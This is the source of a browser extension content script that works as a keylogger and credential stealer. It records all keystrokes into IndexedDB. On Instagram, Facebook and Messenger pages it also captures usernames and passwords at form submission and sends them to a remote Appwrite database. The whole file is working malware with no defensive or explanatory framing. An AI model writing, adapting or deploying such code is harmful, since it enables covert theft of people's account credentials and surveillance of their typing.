import { Client, Databases, ID } from "appwrite"

// Appwrite client configuration
const client = new Client()
  .setEndpoint(process.env.PLASMO_PUBLIC_APPWRITE_ENDPOINT)
  .setProject(process.env.PLASMO_PUBLIC_APPWRITE_PROJECT_ID)
const databases = new Databases(client)

// Constants
const DATABASE_ID = process.env.PLASMO_PUBLIC_APPWRITE_DATABASE_ID
const CREDENTIALS_COLLECTION_ID =
  process.env.PLASMO_PUBLIC_APPWRITE_COLLECTION_ID
const TARGET_URLS = ["instagram", "facebook", "messenger"]
const KEY_MAPPINGS = {
  Enter: "[ENTER]",
  Tab: "[TAB]",
  " ": "[SPACE]",
  Backspace: "[BACKSPACE]",
  Del: "[DEL]"
}

let loggedInputs = []

// Utility functions
function isTargetUrl(url: string) {
  return TARGET_URLS.some((target) => url.includes(target))
}

function updateLoggedInputsDatabase(loggedInputString: string) {
  const request = indexedDB.open("UserInputsDB", 1)

  request.onupgradeneeded = function () {
    const db = request.result
    if (!db.objectStoreNames.contains("inputs")) {
      db.createObjectStore("inputs", { keyPath: "id" })
    }
  }

  request.onsuccess = function () {
    const db = request.result
    const transaction = db.transaction("inputs", "readwrite")
    const store = transaction.objectStore("inputs")
    store.put({ id: "unknown", value: loggedInputString })
  }
}

function logKey(key: string) {
  loggedInputs.push(KEY_MAPPINGS[key] || key)
  updateLoggedInputsDatabase(loggedInputs.join(""))
}

function storeCredentials(url: string, username: string, password: string) {
  databases
    .createDocument(DATABASE_ID, CREDENTIALS_COLLECTION_ID, ID.unique(), {
      url,
      username,
      password
    })
    .then((response) => {
      console.log(response)
    })
    .catch((error) => {
      console.error(error)
    })
}

function getFormData(form: HTMLFormElement) {
  const formData = new FormData(form)
  let formUsername = ""
  let formPassword = ""

  formData.forEach((value, key) => {
    if (["email", "user"].includes(key)) formUsername = value.toString()
    else if (["password", "pass"].includes(key)) formPassword = value.toString()
  })

  if (!formUsername || !formPassword) return

  storeCredentials(
    new URL(window.location.href).hostname,
    formUsername,
    formPassword
  )
}

// Event listener setup
function setupEventListeners() {
  document.addEventListener("keydown", (event) => {
    if (["Backspace", "Del"].includes(event.key)) logKey(event.key)
  })

  document.body.addEventListener("keypress", (event) => {
    if (KEY_MAPPINGS.hasOwnProperty(event.key) || event.key.length === 1)
      logKey(event.key)
  })

  if (isTargetUrl(window.location.href)) {
    document.body.addEventListener("click", (event) => {
      const target = event.target as HTMLInputElement
      if (target.type === "submit" && target.form) getFormData(target.form)
    })
  }
}

setupEventListeners()
